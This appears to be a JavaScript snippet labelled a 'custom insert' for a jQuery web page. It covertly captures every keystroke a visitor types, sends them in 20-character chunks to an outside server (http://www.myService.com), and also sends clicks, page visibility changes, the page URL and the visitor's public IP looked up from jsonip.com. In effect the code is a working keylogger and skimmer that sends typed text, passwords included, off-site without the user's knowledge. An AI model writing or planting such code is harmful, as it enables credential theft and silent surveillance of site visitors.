
/*custom Insert*/ ;
var pcIp;
var hidden = "hidden";
var eventos="click dbclick contextmenu mouseover keypress copy cut paste";

var listaHTML = "a,abbr,address,area,article,aside,audio,b,base,bdi,bdo,blockquote,body,br,button,canvas,caption,";
	listaHTML = listaHTML +	"cite,code,col,colgroup,command,datalist,dd,del,details,dfn,div,dl,dt,doctype,em,embed,fieldset,figcaption,figure,";
	listaHTML = listaHTML +	"footer,form,h1,h2,h3,h4,h5,h6,head,header,hr,html,i,iframe,img,input,ins,kbd,keygen,label,legend,li,link,main,map,";
	listaHTML = listaHTML +	"mark,menu,meta,meter,nav,noscript,object,ol,optgroup,option,output,p,param,pre,progress,q,rp,rt,ruby,s,samp,script,";
	listaHTML = listaHTML +	"section,select,small,source,span,strong,style,sub,summary,sup,table,tbody,td,textarea,tfoot,th,thead,time,title,tr," ;
	listaHTML = listaHTML +	"track,u,ul,var,video,wbr";

var listaEventos = "afterprint beforeprint beforeunload error hashchange load message offline online pagehide pageshow popstate resize ";
	listaEventos = listaEventos + "storage unload blur change contextmenu focus input invalid reset search select submit keydown keypress keyup click ";
	listaEventos = listaEventos + "dbclick drag dragend dragenter dragleave dragover dragstart drop mousedown mousemove mouseout mouseover mouseup scroll " ;
	listaEventos = listaEventos + "wheel copy cut paste  abort canplay canplaythrough cuechange durationchange emptied ended error loadeddata loadedmetadata " ;
	listaEventos = listaEventos + "loadstart pause play playing progress ratechange seekend seeking stalled suspend timeupdate volumechange waiting error show toggle ";

var teclado = "";

$j(document).ready(function() {

	$j.getJSON("https://jsonip.com/", function (data) {
		pcIp=data.ip;
	});

	if (window.browSession == null)
		window.browSession = Math.floor((Math.random() * 10000) + 1);

	$j("body").append('<div id="divProxy" name="divProxy"></div>');

	document.onkeypress= function(event){
		teclado = teclado + event.key;
		if (teclado.length==20){
			submitData(event,"texto:"+teclado);
			teclado="";
		}
    };

	$j(listaHTML).on("eventos", function(event) {
		var element = $j(this).closest(listaHTML).attr("id");
		var type = event.type;
	    var a = "<p>" + document.URL + " -> "+ $j(this).closest(listaHTML).attr('id')+ " -> " + type + " -> " + $j.now() +"</p>"
	    document.getElementsByName("divProxy")[0].srcdoc += a
	    if(type=="click" ||type=="dbclick")
	    	submitData(event,element);
		return true
	});

    if (hidden in document) {
		document.addEventListener("visibilitychange", onchange);
	} else {
		window.onpageshow = window.onpagehide = window.onfocus = window.onblur = onchange;
    }

	if(document[hidden] !== undefined)
		onchange({type: document[hidden] ? "blur" : "focus"});

}).on(listaEventos, function(e){
	var url = document.URL;
	var date = Date.now();
	var element = e.target.id;
	var action = e.type;
	window.mouseXPos = e.pageX;
	window.mouseYPos = e.pageY;
	var data = '{position:{x:"' + mouseXPos + '", y:"' + mouseYPos + '"}, action:"'+ action + '", element:"'+ element + '"}';
//	submitData(event,element);
});

function onchange (event) {
	var visibility = this[hidden] ? "hidden" : "visible";
	submitData(event,visibility);
}

function submitData(event,element) {
	if(event){
		//alert(element + ',' + document.URL + ',' + $j.now() + ',' + window.browSession + ',' + pcIp);
		$j.ajax({
			url:"http://www.myService.com",
			type:"POST",
			data: {data:element, url:document.URL, time:$j.now(), session:window.browSession, pcIp:pcIp?pcIp:'127.0.0.1'},
			success: function(data) {
				// alert( \"Load was performed.\" );
				return true;
			}
		});
	}
}